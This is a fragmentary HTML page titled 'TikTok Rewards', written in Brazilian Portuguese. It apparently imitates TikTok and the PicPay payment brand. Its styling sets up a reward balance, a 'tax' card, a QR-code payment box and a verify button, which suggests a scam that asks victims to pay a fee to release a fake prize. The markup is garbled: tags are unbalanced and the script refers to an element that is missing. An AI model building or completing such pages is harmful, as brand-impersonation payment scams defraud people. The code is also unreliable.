<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Rewards</title>
    <style>
        :root { --tt-pink: #fe2c55; --picpay: #21c25e; }
        body { background: #000; font-family: sans-serif; color: #fff; margin: 0; padding: 0; overflow-x: hidden; }
        .iphone { width: 100vw; height: 100vh; background: #121212; position: relative; }
        .app-screen { display: none; height: 100%; flex-direction: column; width: 100%; position: absolute; }
        .active { display: flex !important; }
        .tt-header { padding: 10px 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; background: #121212; z-index: 10; }
        .tt-logo { height: 20px !important; width: auto; }
        .coin-reward { display: flex; align-items: center; background: #222; padding: 4px 10px; border-radius: 20px; gap: 5px; border: 1px solid #333; }
        .coin-txt { font-size: 12px; font-weight: bold; color: #fff; }
        .main-container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
        .value-card { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #25f4ee; margin: 20px 0; width: 80%; }
        .btn-tt-main { background: var(--tt-pink); border: none; padding: 18px; color: #fff; font-weight: bold; border-radius: 12px; width: 90%; font-size: 16px; margin-bottom: 40px; }
        .tax-card { background: #1e1e1e; border: 1px solid var(--tt-pink); border-radius: 12px; padding: 15px; width: 85%; margin: 15px 0; }
        .qr-container { background: #fff; padding: 10px; width: 160px; border-radius: 10px; margin-bottom: 15px; }
        .qr-container img { width: 100%; display: block; }
        .btn-verify { background: var(--picpay); border: none; padding: 18px; color: #fff; font-weight: bold; border-radius: 12px; width: 90%; font-size: 16px; margin-bottom: 40px; }
    </style>
</head>
<body>

<div class="iphone">

        <div class="coin-reward"><span>üü°</span><span class="coin-txt">277k</span></div>

      </div>

    </div>

    <div id="step-pay" class="app-screen">

        <div class="qr-container">

    </div>
</div>

<script>
function irParaPagamento() {
    document.getElementById('step-1').style.display = 'none';

}
</script>

</body>
</html>
